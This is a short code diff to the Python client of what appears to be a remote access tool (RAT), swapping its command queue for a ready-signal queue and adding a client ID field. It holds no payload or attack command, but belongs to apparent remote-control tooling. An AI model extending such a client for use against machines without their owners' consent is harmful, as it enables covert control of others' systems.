@@ -1,9 +1,10 @@
 import ntpath
 import os
+import queue
 
 from client.commands.common import CommonCommands
 from client.commands.executor import CommandExecutor
-from core.protocol.message_queue import MessageQueue
+from core.protocol.message_queue import MessageQueue, ReadySignalQueue
 from core.protocol.ratsocket import RATSocket
 from core.utils.files import get_input_stream, get_output_stream
 from core.utils.logger import logger
@@ -17,9 +18,15 @@ class ServerConnection(RATSocket):
 
     def __init__(self):
         super().__init__()
+        self.client_id = None
+
         self.command_executor = CommandExecutor(self)
-        self.command_queue = MessageQueue()
+        self.command_queue = ReadySignalQueue()
         self.common_commands = CommonCommands(self)
+
+
+
+
 
     def send_result(self, id: int, status: int, result: str, eof: int = 1):
         """
@@ -51,6 +58,7 @@ class ServerConnection(RATSocket):
         self.send(header)
         if self.recv_signal():
             self.send_io(io)
+
 
     def _handle_command_message(self, command_id: int, data: dict):
         """
